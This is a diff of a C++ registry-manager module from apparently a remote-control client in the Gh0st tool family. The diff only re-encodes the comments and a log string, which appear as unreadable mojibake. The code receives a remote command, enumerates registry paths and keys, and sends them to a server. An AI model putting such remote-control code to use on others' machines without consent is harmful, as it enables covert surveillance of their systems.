@@ -1,4 +1,4 @@
-// RegisterManager.cpp: implementation of the CRegisterManager class.
+ï»¿// RegisterManager.cpp: implementation of the CRegisterManager class.
 //
 //////////////////////////////////////////////////////////////////////
 
@@ -19,17 +19,17 @@ CRegisterManager::CRegisterManager(IOCPClient* ClientObject, int n, void* user):
 
 CRegisterManager::~CRegisterManager()
 {
-    Mprintf("CRegisterManager Îö¹¹\n");
+    Mprintf("CRegisterManager æžæž„\n");
 }
 
 VOID  CRegisterManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 {
     switch (szBuffer[0]) {
-    case COMMAND_REG_FIND:             //²éÊý¾Ý
+    case COMMAND_REG_FIND:             //æŸ¥æ•°æ®
         if(ulLength>3) {
             Find(szBuffer[1],(char*)(szBuffer+2));
         } else {
-            Find(szBuffer[1],NULL);   //RootÊý¾Ý
+            Find(szBuffer[1],NULL);   //Rootæ•°æ®
         }
         break;
     default:
@@ -46,12 +46,12 @@ VOID CRegisterManager::Find(char bToken, char *szPath)
     char *szBuffer= Opt.FindPath();
     if(szBuffer!=NULL) {
         m_ClientObject->Send2Server((char*)szBuffer, LocalSize(szBuffer));
-        //Ä¿Â¼ÏÂµÄÄ¿Â¼
+        //ç›®å½•ä¸‹çš„ç›®å½•
         LocalFree(szBuffer);
     }
     szBuffer = Opt.FindKey();
     if(szBuffer!=NULL) {
-        //Ä¿Â¼ÏÂµÄÎÄ¼þ
+        //ç›®å½•ä¸‹çš„æ–‡ä»¶
         m_ClientObject->Send2Server((char*)szBuffer, LocalSize(szBuffer));
         LocalFree(szBuffer);
     }
